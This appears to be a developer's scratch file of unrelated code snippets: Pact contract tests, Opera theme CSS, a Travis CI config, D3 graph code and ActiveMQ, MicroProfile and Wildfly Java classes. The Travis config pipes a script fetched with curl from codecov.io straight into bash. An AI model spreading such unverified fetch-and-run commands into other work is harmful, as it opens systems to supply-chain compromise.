        final ResponseEntity<String> postResponse = new RestTemplate().exchange(this.mockProvider.getUrl() + "/pact", HttpMethod.POST, new HttpEntity<>(jsonBody, httpHeaders), String.class);

        // then
        assertThat(postResponse.getStatusCode().value()).isEqualTo(201);
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
:host,
:root {
  --scrollbar-color: var(--opera-dark-scrollbar-color);
  --scrollbar-hover-color: var(--opera-dark-scrollbar-hover-color);
}

:host-context(html.dark-theme) {
  --scrollbar-color: var(--opera-light-scrollbar-color);
  --scrollbar-hover-color: var(--opera-light-scrollbar-hover-color);
}

::-webkit-scrollbar {
  height: 12px;
  width: 12px;
}

::-webkit-scrollbar-thumb {
  background-clip: padding-box;
  background-color: var(--scrollbar-color);
  border: 2px solid transparent;
  border-radius: 10px;
}

::-webkit-scrollbar-thumb:hover {
  background-color: var(--scrollbar-hover-color);
}

::-webkit-scrollbar-corner {
  background-color: transparent;
}

var restman = restman || {};
restman.ui = restman.ui || {};

(function() {
    'use strict';

    restman.ui.editors = {
        _editors: {},

        create: function(textareaId, readonly) {
            var options = { 'lineNumbers': true, 'matchBrackets': true }
            if (readonly) {
                options['readOnly'] = true;
            }
            restman.ui.editors._editors[textareaId] = CodeMirror.fromTextArea($(textareaId)[0], options);
            return textareaId;
        },

        get: function(id) {
            return restman.ui.editors._editors[id];
        },

        setValue: function(id, value) {
            var e = restman.ui.editors.get(id);
            e.setValue(value);
            e.refresh();
        }
    };
})();
==============================================================================================================
uuidgen

alias ts='date +%s'

random-string()
{
    cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n ${1:-1}
}

random-string 10 4
==============================================================================================================
language: java
sudo: false

jdk:
 - openjdk8

install:
  - mvn --settings .travis/settings.xml install -DskipTests=true -Dgpg.skip -Dmaven.javadoc.skip=true -B -V

before_install:
  - if [ ! -z "$GPG_SECRET_KEYS" ]; then echo $GPG_SECRET_KEYS | base64 --decode | $GPG_EXECUTABLE --import; fi
  - if [ ! -z "$GPG_OWNERTRUST" ]; then echo $GPG_OWNERTRUST | base64 --decode | $GPG_EXECUTABLE --import-ownertrust; fi


after_success:
  - bash <(curl -s https://codecov.io/bash)

deploy:
  - provider: script
    script: .travis/deploy.sh
    skip_cleanup: true
    on:
      repo: lanwen/wiremock-junit5
      branch: master
  - provider: script
    script: .travis/deploy.sh
    skip_cleanup: true
    on:
      repo: lanwen/wiremock-junit5
      tags: true

notifications:
 email: false

cache:
  directories:
    - $HOME/.m2
	
	
if [ ! -z "$TRAVIS_TAG" ]
then
    echo "on a tag -> set pom.xml <version> to $TRAVIS_TAG"
    mvn --settings .travis/settings.xml org.codehaus.mojo:versions-maven-plugin:2.1:set -DnewVersion=$TRAVIS_TAG 1>/dev/null 2>/dev/null
else
    echo "not on a tag -> keep SNAPSHOT version in pom.xml"
fi

mvn clean deploy --settings .travis/settings.xml -DskipTests=true -B -U
==============================================================================================================
// get the data	
d3.csv("data/spinningheart.csv", function(error, links) {
			
	var nodes = {};

	// process the incoming data
	links.forEach(function(link) {
	    link.source = nodes[link.source] || 
	        (nodes[link.source] = {name: link.source});
	    link.target = nodes[link.target] || 
	        (nodes[link.target] = {name: link.target});
	    link.value = +link.value;
	});
	
	var width = 900,
	    height = 600;

	var color = d3.scale.category20();

	var force = d3.layout.force()
	    // negative value results in node repulsion
	    .charge(-150)
	    // sets the target distance between linked
	    .linkDistance(275)
	    .size([width, height]);

	var svg = d3.select("#graph").append("svg")
	    .attr("width", width)
	    .attr("height", height);
				
	force.nodes(d3.values(nodes))
		.links(links)
		.start();
		
	// add the connections	
	var link = svg.selectAll(".link")
		.data(links)
		.enter().append("line")
		.attr("class", "link")
 		.style("stroke-width", function(d) { return Math.sqrt(d.value); });
						
	// create the groups					
	var node = svg.selectAll(".node")
		.data(force.nodes())
		.enter()
		.append("g")
		.attr("class", "node")
		.style("fill", function(d) { return color(d.group); })
		.call(force.drag);

	// assign a circle to each group
	node.append("circle")
		.attr("r", 5);
	
	node.append("text")
	.attr({
	    "x": 12,
	    "y": ".35em",
	    "class":"nodelabel",
        "stroke":"grey"
        })
		.text(function(d) { return d.name; });

	force.on("tick", function() {
		link.attr("x1", function(d) { return d.source.x; })
			.attr("y1", function(d) { return d.source.y; })
		  .attr("x2", function(d) { return d.target.x; })
		  .attr("y2", function(d) { return d.target.y; });

		node
			.attr("cx", function(d) { return d.x; })
			.attr("cy", function(d) { return d.y; });
		
		node
			.attr("transform", function(d) { return "translate(" + d.x + "," + d.y + ")"; });		
	});
});
==============================================================================================================
/* Defaults (light theme) */

:root,
:host {
  --opera-blue: #0199ff;
  --opera-blue-secondary: #0199ffa0;
  --opera-red: #f54a4b;

  --opera-primary-color: var(--opera-blue);
  --opera-secondary-color: var(--opera-blue-secondary);
}

:root,
:host {
  --opera-blue-hover: #008ae6;
  --opera-blue-pressed: #0077e6;

  --opera-icon-size: 20px;
  --opera-logo-size: 32px;
  --opera-menu-width: 240px;
  --opera-menu-item-height: 32px;
  --opera-section-spacing: 56px;

  --opera-header-height: 64px;
  --opera-header-padding: 16px 30px;
  --opera-header-title-padding: 0 0 0 44px;
  --opera-header-font-size: 17px;
  --opera-header-font-weight: 450;

  --max-search-box-width: 620px;

  --opera-default-font-weight: 500;
  /*  /*   */

  --opera-default-font-size: 13px;
  --opera-headline-font-size: 36px;

  --opera-section-font-size: 15px;
  --opera-section-font-weight: 500;
  --opera-section-margin: 26px 0 12px 0;

  --opera-uppercase-font-size: 14px;

  --opera-background-color: #f5f5f7;
  --opera-secondary-background-color: #ffffff;
  --opera-secondary-background-hover-color: #f8f8fa;

  --opera-tile-background-color: #ffffff;
  --opera-tile-text-color: #000000;

  --opera-separator-color: #e6e6e6;
  --opera-search-border-color: transparent;

  --opera-focus-outline-color: rgba(1, 153, 255, .4);

  --opera-font-family: system-ui;
  --opera-font-color: #121314;
  --opera-secondary-font-color: #6a6a75;
  --opera-hint-font-color: #6e767a;

  --opera-folder-background-color: #E6EEF5;

  --opera-article-font-size: 16px;
  --opera-article-font-weight: 600;

  --opera-input-background-color: #ffffff;
  --opera-input-background-color-hover: #fafafa;
  --opera-input-background-color-pressed: #ededed;
  --opera-input-font-size: 13px;
  --opera-input-border-color: #cdcdd4;
  --opera-input-border-radius: 3px;
  --opera-input-border-width: 1px;
  --opera-input-padding: 8px 16px;
  --opera-input-height: 32px;
  --opera-rounded-input-border-radius: 16px;

  --opera-search-icon-color: var(--opera-secondary-font-color);
  --opera-search-background-size: 16px;
  --opera-search-padding: 7px 36px 7px 15px;

  --opera-button-font-color: var(--opera-font-color);
  --opera-button-background-color: var(--opera-input-background-color);
  --opera-button-background-color-hover: #f8f8fa;
  --opera-button-border-color: var(--opera-input-border-color);
  --opera-button-padding: 6px 12px;

  --opera-button-disabled-background-color: #ffffff;
  --opera-button-disabled-border-color: #ebebee;
  --opera-button-disabled-font-color: #a0a1a1;

  --opera-primary-button-font-color: #fff;
  --opera-primary-button-background-color: var(--opera-blue);
  --opera-primary-button-background-color-hover: var(--opera-blue-hover);
  --opera-primary-button-background-color-pressed: var(--opera-blue-pressed);
  --opera-primary-button-border-color: #0084ff;
  --opera-primary-button-padding: 6px 16px;

  --opera-primary-button-disabled-background-color: var(--opera-button-background-color);
  --opera-primary-button-disabled-border-color: var(--opera-separator-color);
  --opera-primary-button-disabled-font-color: var(--opera-separator-color);

  --opera-switch-color: #ceced4;
  --opera-switch-color-hover: #bcbcc6;
  --opera-switch-color-pressed: #ceced4;
  --opera-switch-active-color: var(--opera-blue);
  --opera-switch-active-color-hover: var(--opera-blue-hover);
  --opera-switch-active-color-pressed: var(--opera-blue-pressed);
  --opera-switch-toggle-color: #fff;
  --opera-switch-height: 20px;
  --opera-switch-width: 40px;

  --opera-pad-border-radius: 5px;
  --opera-pad-padding: 20px;
  --opera-pad-shadow: 0 10px 20px -8px rgba(0, 0, 0, 0.04);
  --opera-box-shadow: 0 10px 20px -8px rgba(0, 0, 0, 0.24);

  --opera-link-color: rgba(0, 122, 204, 1);
  --opera-link-hover-background-color: rgba(0, 122, 204,.08);
  --opera-link-focus-background-color: rgba(0, 122, 204,.24);

  --opera-text-line-height: 1.5;

  --opera-navbar-background-color: #ffffff;
  --opera-navbar-separator-color: #e6e6e6;
  --opera-navbar-width: 0px;

  --opera-progress-border-radius: 3px;
  --opera-progress-bar-color: #0199ff;
  --opera-progress-bar-secondary-color: #5dbae9;
  --opera-progress-background-color: rgb(231, 231, 231);

  --opera-scrollbar-width: 12px;

  --opera-dark-scrollbar-color: #9995;
  --opera-dark-scrollbar-hover-color: #6668;
  --opera-light-scrollbar-color: #6665;
  --opera-light-scrollbar-hover-color: #9998;

  --speeddial-tile-width: 140px;
  --speeddial-tile-height: 89px;
  --speeddial-tile-spacing: 20px;

  --opera-drop-shadow-filter: none;

  --opera-settings-menu-width: 240px;

  --opera-modal-border-width: 0;
  --opera-modal-background-color: var(--opera-secondary-background-color);
  --opera-modal-header-color: var(--opera-secondary-background-color);
  --opera-modal-header-font-color: var(--opera-secondary-font-color);
}

/* Dark theme */

:root.dark-theme,
:host-context(html.dark-theme) {

  --opera-blue: #45b0e6;
  --opera-blue-secondary: #45b0e6a0;
  --opera-blue-hover: #49baf2;
  --opera-blue-pressed: #3d9ccc;
  --opera-red: #ff776c;

  --opera-background-color: #121314;
  --opera-secondary-background-color: #1c1d1f;
  --opera-secondary-background-hover-color: #222325;

  --opera-tile-background-color: var(--opera-folder-background-color);
  --opera-tile-text-color: #f0f0f0;

  --opera-separator-color: #333435;

  --opera-focus-outline-color: rgba(69, 176, 230, .48);

  --opera-font-color: #fafafa;
  --opera-secondary-font-color: #a8abad;
  --opera-hint-font-color: #b4c1cc;

  --opera-folder-background-color: #2a343d;

  --opera-input-background-color: #3d4042;
  --opera-input-border-color: #404547;
  --opera-input-background-color-hover: #494c4f;
  --opera-input-background-color-pressed: #262729;

  --opera-button-disabled-background-color: #292b2c;
  --opera-button-disabled-border-color: #292b2c;
  --opera-button-disabled-font-color: #757576;

  --opera-switch-color: #3d4042;
  --opera-switch-color-hover: #494c4f;
  --opera-switch-color-pressed: #3d4042;

  --opera-pad-shadow: 0 10px 20px -8px rgba(0, 0, 0, 0.25);

  --opera-button-background-color-hover: #494c4f;

  --opera-primary-button-font-color: var(--opera-font-color);
  --opera-primary-button-border-color: #4993b8;

  --opera-primary-button-disabled-font-color: var(--opera-separator-color);
  --opera-primary-button-disabled-background-color: var(--opera-button-background-color);
  --opera-primary-button-disabled-border-color: var(--opera-button-background-color);

  --opera-navbar-background-color: #171819;
  --opera-navbar-separator-color: #000000;

  --opera-link-color: #96ddff;
  --opera-link-hover-background-color: rgba(150, 221, 255, .24);
  --opera-link-focus-background-color: rgba(150, 221, 255, .48);

  --opera-progress-bar-color: rgb(69, 176, 230);
  --opera-progress-bar-secondary-color: rgb(120, 198, 237);
  --opera-progress-background-color: rgb(43, 43, 43);
}

:root.gx,
:host-context(html.gx) {
  --opera-background-color: #14111a;
  --opera-secondary-background-color: #131218;

  --opera-link-color: var(--opera-gx-color);
  --opera-link-hover-background-color: var(--opera-gx-shadow-color);
  --opera-link-focus-background-color: var(--opera-gx-secondary-color);

  --opera-focus-outline-color: var(--opera-gx-secondary-color);

  --opera-drop-shadow-filter: none;
  /* TODO(aswitalski) - use: drop-shadow(4px 4px 4px rgba(0, 0, 0, 0.32)); */

  --opera-modal-border-width: 1px;
  --opera-modal-background-color: #19171F;
  --opera-modal-header-color: #2f2a3d;
  --opera-modal-header-font-color: #eaE6f5;

  --opera-primary-color: var(--opera-gx-color);
  --opera-secondary-color: var(--opera-gx-secondary-color);

  --opera-primary-button-font-color: var(--opera-gx-font-color);
  --opera-primary-button-background-color: var(--opera-gx-color);
  --opera-primary-button-disabled-background-color: var(--opera-secondary-color);
  --opera-primary-button-background-color-hover: var(--opera-gx-color);
  --opera-primary-button-border-color: var(--opera-secondary-color);
}

:root.bigger-tiles:not(.gx),
:host-context(html.bigger-tiles:not(.gx)) {
  --speeddial-tile-width: 188px;
  --speeddial-tile-height: 120px;
  --speeddial-tile-spacing: 24px;
}
==============================================================================================================
import org.eclipse.microprofile.metrics.MetricUnits;

/**
 * @author hrupp, Michal Szynkiewicz, michal.l.szynkiewicz@gmail.com
 */
public class ExporterUtil {

    public static final long NANOS_PER_MICROSECOND = 1_000;
    public static final long NANOS_PER_MILLI = 1_000_000;
    public static final long NANOS_PER_SECOND = 1_000_000_000;
    public static final long NANOS_PER_MINUTE = 60 * 1_000_000_000L;
    public static final long NANOS_PER_HOUR = 3600 * 1_000_000_000L;
    public static final long NANOS_PER_DAY = 24 * 3600 * 1_000_000_000L;

    private ExporterUtil() {
    }

    public static Double convertNanosTo(Double value, String unit) {

        Double out;

        switch (unit) {
            case MetricUnits.NANOSECONDS:
                out = value;
                break;
            case MetricUnits.MICROSECONDS:
                out = value / NANOS_PER_MICROSECOND;
                break;
            case MetricUnits.MILLISECONDS:
                out = value / NANOS_PER_MILLI;
                break;
            case MetricUnits.SECONDS:
                out = value / NANOS_PER_SECOND;
                break;
            case MetricUnits.MINUTES:
                out = value / NANOS_PER_MINUTE;
                break;
            case MetricUnits.HOURS:
                out = value / NANOS_PER_HOUR;
                break;
            case MetricUnits.DAYS:
                out = value / NANOS_PER_DAY;
                break;
            default:
                out = value;
        }
        return out;
    }
}

import java.util.EnumSet;

/**
 * An enumeration representing the different types of metrics.
 * 
 * @author hrupp, Raymond Lam, Ouyang Zhou
 */
public enum MetricType {
    /**
     * A Counter monotonically in-/decreases its values.
     * An example could be the number of Transactions committed.
     */
    COUNTER("counter", Counter.class),

    /**
     * A Gauge has values that 'arbitrarily' goes up/down at each
     * sampling. An example could be CPU load
     */
    GAUGE("gauge", Gauge.class),

    /**
     * A Meter measures the rate at which a set of events occur.
     * An example could be amount of Transactions per Hour.
     */
    METERED("meter", Meter.class),

    /**
     * A Histogram calculates the distribution of a value.
     */
    HISTOGRAM("histogram", Histogram.class),

    /**
     * A timer aggregates timing durations and provides duration 
     * statistics, plus throughput statistics
     */
    TIMER("timer", Timer.class),
    
    /**
     * Invalid - Placeholder
     */
    INVALID("invalid", null)
    ;


  private String type;
  private Class<?> classtype;

  MetricType(String type, Class<?> classtype) {
    this.type = type;
    this.classtype = classtype;
  }

  public String toString() {
    return type;
  }

  /**
   * Convert the string representation into an enum
   * @param in the String representation
   * @return the matching Enum
   * @throws IllegalArgumentException if in is not a valid enum value
   */
  public static MetricType from(String in) {
    EnumSet<MetricType> enumSet = EnumSet.allOf(MetricType.class);
    for (MetricType u : enumSet) {
      if (u.type.equals(in)) {
        return u;
      }
    }
    throw new IllegalArgumentException(in + " is not a valid MetricType");
  }

  /**
   * Convert the metric class type into an enum
   * @param in The metric class type
   * @return the matching Enum
   * @throws IllegalArgumentException if in is not a valid enum value
   */
  public static MetricType from(Class<?> in) {
    EnumSet<MetricType> enumSet = EnumSet.allOf(MetricType.class);
    for (MetricType u : enumSet) {
      if (u.classtype != null && u.classtype.equals(in)) {
        return u;
      }
    }
    return MetricType.INVALID;
  }
}
==============================================================================================================
https://www.baeldung.com/pact-junit-consumer-driven-contracts
==============================================================================================================
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<RestMessage> handleArgumentNotValidException(MethodArgumentNotValidException ex, Locale locale) {
        BindingResult result = ex.getBindingResult();
        List<String> errorMessages = result.getAllErrors()
                .stream()
                .map(objectError -> messageSource.getMessage(objectError, locale))
                .collect(Collectors.toList());
        return new ResponseEntity<>(new RestMessage(errorMessages), HttpStatus.BAD_REQUEST);
    }
	
	package au.com.dius.pact.provider.junit;

http://vdlg-pba11-redis-1.pba.internal:5027/swagger/registry/index.html
import java.lang.annotation.ElementType;
import java.lang.annotation.Inherited;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * Used to mark methods that should be run on state change
 */
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.METHOD})
@Inherited
public @interface State {
  /**
   * @return list of state names
   */
  String[] value();

  /**
   * Whether to run the method before (SETUP) or after (TEARDOWN) the interaction
   */
  StateChangeAction action() default StateChangeAction.SETUP;
}

==============================================================================================================
public class AdminImportedUserId  {
  @Rule
  public PactProviderRuleMk2 mockProvider = new PactProviderRuleMk2("provider_app", PactSpecVersion.V2, this);

  @Pact(provider = "provider_app", consumer = "consumer_app")
  public RequestResponsePact createFragment(PactDslWithProvider builder) throws IOException {
    return builder
        .given("an admin with two imported users")
        .uponReceiving("a get request for admin imported user id")
        .path("/api/admin/users/imports/1")
        .method("GET")
        .headers(new ProviderClient().getHeaders())
        .willRespondWith()
        .status(200)
        .body("{\"meta\":{},\"linked\":{\"contexts\":[{\"id\":1,\"class\":\"Domain\"}]},\"imports\":[{\"id\":\"160\","
        + "\"context_id\":\"1\",\"user_name\":\"user10 Royer\",\"context_description\":\"Dev Environment\","
        + "\"context_type\":\"Domain\",\"completed\":17,\"total\":17,\"state\":\"complete\",\"new_user_count\":0,"
        + "\"restored_user_count\":0,\"updated_user_count\":17,\"deleted_user_count\":0,\"ignored_user_count\":0,"
        + "\"deported_user_count\":17,\"invalid_rows\":[],\"created_at\":\"2017-09-23T13:13:21.132-06:00\","
        + "\"user_id\":4078}]}")
        .toPact();
  }
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import java.util.Collections;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Map;

/**
 * Defines all {@link ActiveMQException} types and their codes.
 */
public enum ActiveMQExceptionType {

   // Error codes -------------------------------------------------

   INTERNAL_ERROR(000) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInternalErrorException(msg);
      }
   },
   UNSUPPORTED_PACKET(001) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnsupportedPacketException(msg);
      }
   },
   NOT_CONNECTED(002) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQNotConnectedException(msg);
      }
   },
   CONNECTION_TIMEDOUT(003) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQConnectionTimedOutException(msg);
      }
   },
   DISCONNECTED(004) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDisconnectedException(msg);
      }
   },
   UNBLOCKED(005) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnBlockedException(msg);
      }
   },
   IO_ERROR(006) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIOErrorException(msg);
      }
   },
   QUEUE_DOES_NOT_EXIST(100) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQNonExistentQueueException(msg);
      }
   },
   QUEUE_EXISTS(101) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQQueueExistsException(msg);
      }
   },
   OBJECT_CLOSED(102) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQObjectClosedException(msg);
      }
   },
   INVALID_FILTER_EXPRESSION(103) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidFilterExpressionException(msg);
      }
   },
   ILLEGAL_STATE(104) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIllegalStateException(msg);
      }
   },
   SECURITY_EXCEPTION(105) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQSecurityException(msg);
      }
   },
   ADDRESS_DOES_NOT_EXIST(106) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressDoesNotExistException(msg);
      }
   },
   ADDRESS_EXISTS(107) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressExistsException(msg);
      }
   },
   INCOMPATIBLE_CLIENT_SERVER_VERSIONS(108) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIncompatibleClientServerException(msg);
      }
   },
   LARGE_MESSAGE_ERROR_BODY(110) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQLargeMessageException(msg);
      }
   },
   TRANSACTION_ROLLED_BACK(111) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionRolledBackException(msg);
      }
   },
   SESSION_CREATION_REJECTED(112) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQSessionCreationException(msg);
      }
   },
   DUPLICATE_ID_REJECTED(113) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDuplicateIdException(msg);
      }
   },
   DUPLICATE_METADATA(114) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDuplicateMetaDataException(msg);
      }
   },
   TRANSACTION_OUTCOME_UNKNOWN(115) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionOutcomeUnknownException(msg);
      }
   },
   ALREADY_REPLICATING(116) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAlreadyReplicatingException(msg);
      }
   },
   INTERCEPTOR_REJECTED_PACKET(117) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInterceptorRejectedPacketException(msg);
      }
   },
   INVALID_TRANSIENT_QUEUE_USE(118) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidTransientQueueUseException(msg);
      }
   },
   REMOTE_DISCONNECT(119) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQRemoteDisconnectException(msg);
      }
   },
   TRANSACTION_TIMEOUT(120) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionTimeoutException(msg);
      }
   },
   GENERIC_EXCEPTION(999),
   NATIVE_ERROR_INTERNAL(200),
   NATIVE_ERROR_INVALID_BUFFER(201),
   NATIVE_ERROR_NOT_ALIGNED(202),
   NATIVE_ERROR_CANT_INITIALIZE_AIO(203),
   NATIVE_ERROR_CANT_RELEASE_AIO(204),
   NATIVE_ERROR_CANT_OPEN_CLOSE_FILE(205),
   NATIVE_ERROR_CANT_ALLOCATE_QUEUE(206),
   NATIVE_ERROR_PREALLOCATE_FILE(208),
   NATIVE_ERROR_ALLOCATE_MEMORY(209),
   ADDRESS_FULL(210) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressFullException(msg);
      }
   },
   LARGE_MESSAGE_INTERRUPTED(211) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQLargeMessageInterruptedException(msg);
      }
   },
   CLUSTER_SECURITY_EXCEPTION(212) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQClusterSecurityException(msg);
      }

   },
   NOT_IMPLEMTNED_EXCEPTION(213),
   MAX_CONSUMER_LIMIT_EXCEEDED(214) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQQueueMaxConsumerLimitReached(msg);
      }
   },
   UNEXPECTED_ROUTING_TYPE_FOR_ADDRESS(215) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnexpectedRoutingTypeForAddress(msg);
      }
   },
   INVALID_QUEUE_CONFIGURATION(216) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidQueueConfiguration(msg);
      }
   },
   DELETE_ADDRESS_ERROR(217) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDeleteAddressException(msg);
      }
   };

   private static final Map<Integer, ActiveMQExceptionType> TYPE_MAP;

   static {
      HashMap<Integer, ActiveMQExceptionType> map = new HashMap<>();
      for (ActiveMQExceptionType type : EnumSet.allOf(ActiveMQExceptionType.class)) {
         map.put(type.getCode(), type);
      }
      TYPE_MAP = Collections.unmodifiableMap(map);
   }

   private final int code;

   ActiveMQExceptionType(int code) {
      this.code = code;
   }

   public int getCode() {
      return code;
   }

   public ActiveMQException createException(String msg) {
      return new ActiveMQException(msg + ", code:" + this);
   }

   public static ActiveMQException createException(int code, String msg) {
      return getType(code).createException(msg);
   }

   public static ActiveMQExceptionType getType(int code) {
      ActiveMQExceptionType type = TYPE_MAP.get(code);
      if (type != null)
         return type;
      return ActiveMQExceptionType.GENERIC_EXCEPTION;
   }
}

public enum RoutingType {

   MULTICAST, ANYCAST;

   public byte getType() {
      switch (this) {
         case MULTICAST:
            return 0;
         case ANYCAST:
            return 1;
         default:
            return -1;
      }
   }

   public static RoutingType getType(byte type) {
      switch (type) {
         case 0:
            return MULTICAST;
         case 1:
            return ANYCAST;
         default:
            return null;
      }
   }
}

https://github.com/jmesnil/activemq-artemis/blob/master/artemis-commons/src/main/java/org/apache/activemq/artemis/api/core/SimpleString.java


import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.util.Locale;

/**
 * Provides general information about the processors on this host.
 *
 * @author Jason T. Greene
 */
public class ProcessorInfo {
    private ProcessorInfo() {
    }

    private static final String CPUS_ALLOWED = "Cpus_allowed:";
    private static final byte[] BITS = new byte[]{0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4};
    private static final Charset ASCII = Charset.forName("US-ASCII");

    /**
     * Returns the number of processors available to this process. On most operating systems this method
     * simply delegates to {@link Runtime#availableProcessors()}. However, on Linux, this strategy
     * is insufficient, since the JVM does not take into consideration the process' CPU set affinity
     * which is employed by cgroups and numactl. Therefore this method will analyze the Linux proc filesystem
     * to make the determination. Since the CPU affinity of a process can be change at any time, this method does
     * not cache the result. Calls should be limited accordingly.
     * <br>
     * Note tha on Linux, both SMT units (Hyper-Threading) and CPU cores are counted as a processor.
     *
     * @return the available processors on this system.
     */
    public static int availableProcessors() {
        if (System.getSecurityManager() != null) {
            return AccessController.doPrivileged((PrivilegedAction<Integer>) () -> Integer.valueOf(determineProcessors())).intValue();
        }

        return determineProcessors();
    }

    private static int determineProcessors() {
        int javaProcs = Runtime.getRuntime().availableProcessors();
        if (!isLinux()) {
            return javaProcs;
        }

        int maskProcs = 0;

        try {
            maskProcs = readCPUMask();
        } catch (Exception e) {
            // yum
        }

        return maskProcs > 0 ? Math.min(javaProcs, maskProcs) : javaProcs;
    }

    private static int readCPUMask() throws IOException {
        final FileInputStream stream = new FileInputStream("/proc/self/status");
        final InputStreamReader inputReader = new InputStreamReader(stream, ASCII);

        try (BufferedReader reader = new BufferedReader(inputReader)) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith(CPUS_ALLOWED)) {
                    int count = 0;
                    int start = CPUS_ALLOWED.length();
                    for (int i = start; i < line.length(); i++) {
                         char ch = line.charAt(i);
                         if (ch >= '0' && ch <= '9') {
                             count += BITS[ch - '0'];
                         } else if (ch >= 'a' && ch <= 'f') {
                             count += BITS[ch - 'a' + 10];
                         } else if (ch >= 'A' && ch <= 'F') {
                             count += BITS[ch - 'A' + 10];
                         }
                     }
                     return count;
                 }
             }
         }

         return -1;
     }

    private static boolean isLinux() {
        String osArch = System.getProperty("os.name", "unknown").toLowerCase(Locale.US);
        return (osArch.contains("linux"));
    }
}

import org.wildfly.common.iteration.ByteIterator;
import org.wildfly.common.iteration.CodePointIterator;

/**
 * A base-32 alphabet.
 *
 * @see ByteIterator#base32Encode(Base32Alphabet)
 * @see CodePointIterator#base32Decode(Base32Alphabet)
 */
public abstract class Base32Alphabet extends Alphabet {

    /**
     * Construct a new instance.
     *
     * @param littleEndian {@code true} if the alphabet is little-endian (LSB first), {@code false} otherwise
     */
    protected Base32Alphabet(final boolean littleEndian) {
        super(littleEndian);
    }

    /**
     * Encode the given 5-bit value to a code point.
     *
     * @param val the 5-bit value
     * @return the Unicode code point
     */
    public abstract int encode(int val);

    /**
     * Decode the given code point.  If the code point is not valid, -1 is returned.
     *
     * @param codePoint the code point
     * @return the decoded 5-bit value or -1 if the code point is not valid
     */
    public abstract int decode(int codePoint);

    /**
     * The standard <a href="http://tools.ietf.org/html/rfc4648">RFC 4648</a> base-32 alphabet.
     */
    public static final Base32Alphabet STANDARD = new Base32Alphabet(false) {
        public int encode(final int val) {
            if (val <= 25) {
                return 'A' + val;
            } else {
                assert val < 32;
                return '2' + val - 26;
            }
        }

        public int decode(final int codePoint) {
            if ('A' <= codePoint && codePoint <= 'Z') {
                return codePoint - 'A';
            } else if ('2' <= codePoint && codePoint <= '7') {
                return codePoint - '2' + 26;
            } else {
                return -1;
            }
        }
    };

    /**
     * The standard <a href="http://tools.ietf.org/html/rfc4648">RFC 4648</a> base-32 alphabet mapped to lowercase.
     */
    public static final Base32Alphabet LOWERCASE = new Base32Alphabet(false) {
        public int encode(final int val) {
            if (val <= 25) {
                return 'a' + val;
            } else {
                assert val < 32;
                return '2' + val - 26;
            }
        }

        public int decode(final int codePoint) {
            if ('a' <= codePoint && codePoint <= 'z') {
                return codePoint - 'a';
            } else if ('2' <= codePoint && codePoint <= '7') {
                return codePoint - '2' + 26;
            } else {
                return -1;
            }
        }
    };

}

/**
 * A base-n encoder/decoder alphabet.  Alphabets may be little-endian or big-endian.  Each base has its own subclass.
 */
public abstract class Alphabet {
    private final boolean littleEndian;

    Alphabet(final boolean littleEndian) {
        this.littleEndian = littleEndian;
